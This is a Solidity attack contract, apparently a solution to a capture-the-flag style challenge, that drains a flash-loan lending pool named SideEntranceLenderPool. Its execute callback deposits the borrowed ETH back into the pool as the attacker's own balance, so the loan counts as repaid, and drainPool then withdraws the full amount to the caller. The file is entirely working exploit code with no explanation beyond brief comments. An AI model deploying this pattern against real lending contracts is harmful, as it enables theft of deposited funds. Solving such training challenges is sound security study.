// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract AttackSideEntranceLenderPool {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function drainPool(uint256 ethInPool) external {
        pool.flashLoan(ethInPool);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    function execute() external payable {
        // flash loan entire amounta and deposit it as user
        // Exploit Side Entrance vulnerability in pool
        // exit flash loand and withdraw full amount
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
